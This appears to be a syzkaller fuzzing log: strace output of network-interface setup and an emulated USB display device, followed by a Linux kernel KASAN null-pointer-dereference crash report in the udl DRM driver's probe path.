[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x2b\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3e\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3e"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv_slave_1", ifr_ifindex=43}) = 0
[pid  5086] close(4)                    = 0
[   77.853052][ T5086] batman_adv: batadv0: Interface activated: batadv_slave_0
[   77.861796][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): macvtap0: link becomes ready
[   77.875369][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): macsec0: link becomes ready
[   77.883665][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): batadv_slave_0: link becomes ready
[   77.892541][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_batadv: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x2b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3e\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="geneve0", ifr_ifindex=65}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x41\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3f\x08\x00\x01\x00\xac\x14\x14\x3f"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="geneve0", ifr_ifindex=65}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x41\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3f\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3f"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="geneve0", ifr_ifindex=65}) = 0
[pid  5086] close(4)                    = 0
[   77.917434][ T5086] batman_adv: batadv0: Interface activated: batadv_slave_1
[   77.925245][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): batadv_slave_1: link becomes ready
[   77.935217][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_batadv: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x41\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3f\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="geneve1", ifr_ifindex=66}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x42\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x40\x08\x00\x01\x00\xac\x14\x14\x40"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="geneve1", ifr_ifindex=66}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x42\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="geneve1", ifr_ifindex=66}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x42\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x40\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg0", ifr_ifindex=25}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x19\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x41\x08\x00\x01\x00\xac\x14\x14\x41"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg0", ifr_ifindex=25}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x19\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg0", ifr_ifindex=25}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x19\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg1", ifr_ifindex=26}) = 0
[pid  5086] close(4)                    = 0
[   77.962162][ T5086] netdevsim netdevsim0 netdevsim0: set [1, 0] type 2 family 0 port 6081 - 0
[   77.971080][ T5086] netdevsim netdevsim0 netdevsim1: set [1, 0] type 2 family 0 port 6081 - 0
[   77.980105][ T5086] netdevsim netdevsim0 netdevsim2: set [1, 0] type 2 family 0 port 6081 - 0
[   77.988901][ T5086] netdevsim netdevsim0 netdevsim3: set [1, 0] type 2 family 0 port 6081 - 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x1a\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x42\x08\x00\x01\x00\xac\x14\x14\x42"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg1", ifr_ifindex=26}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x1a\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg1", ifr_ifindex=26}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x1a\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg2", ifr_ifindex=27}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x1b\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x43\x08\x00\x01\x00\xac\x14\x14\x43"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg2", ifr_ifindex=27}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x1b\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x43\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x43"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="wg2", ifr_ifindex=27}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x1b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(3)                    = 0
[pid  5086] mkdir("/dev/binderfs", 0777) = 0
[pid  5086] mount("binder", "/dev/binderfs", "binder", 0, NULL) = 0
[pid  5086] symlink("/dev/binderfs", "./binderfs") = 0
[pid  5086] openat(AT_FDCWD, "/dev/raw-gadget", O_RDWR) = 3
[pid  5086] ioctl(3, USB_RAW_IOCTL_INIT, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, UI_DEV_CREATE or USB_RAW_IOCTL_RUN, 0) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_WRITE, 0x7ffe55bbc480) = 18
[   78.367556][    T9] usb 1-1: new high-speed USB device number 2 using dummy_hcd
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_WRITE, 0x7ffe55bbc480) = 18
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_WRITE, 0x7ffe55bbc480) = 9
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_WRITE, 0x7ffe55bbc480) = 18
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_VBUS_DRAW, 0) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_CONFIGURE, 0) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_READ, 0x7ffe55bbc480) = 0
[   78.727398][    T9] usb 1-1: config 0 interface 0 has no altsetting 0
[   78.734299][    T9] usb 1-1: New USB device found, idVendor=17e9, idProduct=8b4e, bcdDevice=9c.08
[   78.743870][    T9] usb 1-1: New USB device strings: Mfr=0, Product=0, SerialNumber=0
[   78.755503][    T9] usb 1-1: config 0 descriptor??
[pid  5086] close(3)                    = 0
[pid  5086] close(4)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(5)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(6)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(7)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(8)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(9)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(10)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(11)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(12)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(13)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(14)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(15)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(16)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(17)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(18)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(19)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(20)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(21)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(22)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(23)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(24)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(25)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(26)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(27)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(28)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(29)                   = -1 EBADF (Bad file descriptor)
[pid  5086] exit_group(1)               = ?
[   79.057698][    T9] [drm] vendor descriptor length:b9 data:00 00 00 00 00 00 00 00 00 00 00
[   79.066349][    T9] [drm:udl_init] *ERROR* Unrecognized vendor firmware descriptor
[   79.091368][    T9] [drm:udl_init] *ERROR* Selecting channel failed
[   79.106891][    T9] [drm] Initialized udl 0.0.1 20120220 for 1-1:0.0 on minor 2
[   79.115214][    T9] [drm] Initialized udl on minor 2
[   79.137963][    T9] udl 1-1:0.0: [drm] *ERROR* Read EDID byte 0 failed err ffffffb9
[   79.146780][    T9] udl 1-1:0.0: [drm] Cannot find any crtc or sizes
[   79.154591][    T9] general protection fault, probably for non-canonical address 0xdffffc0000000028: 0000 [#1] PREEMPT SMP KASAN
[   79.166335][    T9] KASAN: null-ptr-deref in range [0x0000000000000140-0x0000000000000147]
[   79.174749][    T9] CPU: 0 PID: 9 Comm: kworker/0:1 Not tainted 6.3.0-rc4-next-20230330-syzkaller #0
[   79.184037][    T9] Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 03/02/2023
[   79.194097][    T9] Workqueue: usb_hub_wq hub_event
[   79.199141][    T9] RIP: 0010:drm_crtc_next_vblank_start+0xb3/0x2b0
[   79.205577][    T9] Code: e8 01 00 00 48 69 db 38 02 00 00 48 b8 00 00 00 00 00 fc ff df 49 03 9d 38 03 00 00 4c 8d ab 44 01 00 00 4c 89 ea 48 c1 ea 03 <0f> b6 14 02 4c 89 e8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 67
[   79.225197][    T9] RSP: 0018:ffffc900000e6bb0 EFLAGS: 00010207
[   79.231279][    T9] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[   79.239261][    T9] RDX: 0000000000000028 RSI: ffffffff849f2afb RDI: ffff888079558338
[   79.247252][    T9] RBP: ffffc900000e6c48 R08: 0000000000000005 R09: 0000000000000000
[   79.255232][    T9] R10: 0000000000000001 R11: 0000000000000010 R12: ffff8880795590d8
[   79.263222][    T9] R13: 0000000000000144 R14: ffff8880795590d8 R15: dffffc0000000000
[   79.271206][    T9] FS:  0000000000000000(0000) GS:ffff8880b9800000(0000) knlGS:0000000000000000
[   79.280154][    T9] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   79.286765][    T9] CR2: 00007f17191c7688 CR3: 00000000281af000 CR4: 00000000003506f0
[   79.294751][    T9] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   79.302732][    T9] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   79.310716][    T9] Call Trace:
[   79.314010][    T9]  <TASK>
[   79.316949][    T9]  drm_atomic_helper_wait_for_fences+0x1b4/0x780
[   79.323319][    T9]  ? drm_atomic_helper_check+0x190/0x190
[   79.328992][    T9]  ? drm_atomic_helper_prepare_planes+0x59b/0xba0
[   79.335444][    T9]  drm_atomic_helper_commit+0x1bd/0x370
[   79.341023][    T9]  ? drm_atomic_helper_setup_commit+0x1770/0x1770
[   79.347475][    T9]  drm_atomic_commit+0x20a/0x300
[   79.352472][    T9]  ? drm_atomic_state_alloc+0x110/0x110
[   79.358043][    T9]  ? __drm_printfn_seq_file+0x50/0x50
[   79.363444][    T9]  ? drm_client_rotation+0x45b/0x730
[   79.368751][    T9]  drm_client_modeset_commit_atomic+0x69b/0x7e0
[   79.375019][    T9]  ? __mutex_lock+0x231/0x1350
[   79.379827][    T9]  ? drm_client_rotation+0x730/0x730
[   79.385133][    T9]  ? __mutex_lock+0x231/0x1350
[   79.389916][    T9]  ? __mutex_unlock_slowpath+0x157/0x5e0
[   79.395587][    T9]  ? wait_for_completion_io_timeout+0x20/0x20
[   79.401688][    T9]  ? __drm_fb_helper_initial_config_and_unlock+0xe71/0x1510
[   79.409011][    T9]  drm_client_modeset_commit_locked+0x149/0x580
[   79.415280][    T9]  drm_client_modeset_commit+0x51/0x80
[   79.420765][    T9]  __drm_fb_helper_initial_config_and_unlock+0x118a/0x1510
[   79.428007][    T9]  ? mutex_lock_io_nested+0x11a0/0x11a0
[   79.433587][    T9]  ? drm_fb_helper_find_color_mode_format.isra.0+0x1e0/0x1e0
[   79.440999][    T9]  ? drm_prime_init_file_private+0x23/0x90
[   79.446828][    T9]  ? drm_file_alloc+0x548/0x950
[   79.451703][    T9]  drm_fb_helper_initial_config+0x42/0x60
[   79.457460][    T9]  drm_fbdev_generic_client_hotplug+0x1ab/0x270
[   79.463736][    T9]  drm_fbdev_generic_setup+0x127/0x3b0
[   79.469228][    T9]  udl_usb_probe+0x120/0x190
[   79.473841][    T9]  usb_probe_interface+0x30f/0x960
[   79.478979][    T9]  ? usb_match_dynamic_id+0x1a0/0x1a0
[   79.484373][    T9]  really_probe+0x240/0xca0
[   79.488911][    T9]  __driver_probe_device+0x1df/0x4d0
[   79.494229][    T9]  ? usb_match_id.part.0+0x15d/0x1b0
[   79.499537][    T9]  driver_probe_device+0x4c/0x1a0
[   79.504586][    T9]  __device_attach_driver+0x1d4/0x2e0
[   79.509995][    T9]  bus_for_each_drv+0x149/0x1d0
[   79.514868][    T9]  ? driver_probe_device+0x1a0/0x1a0
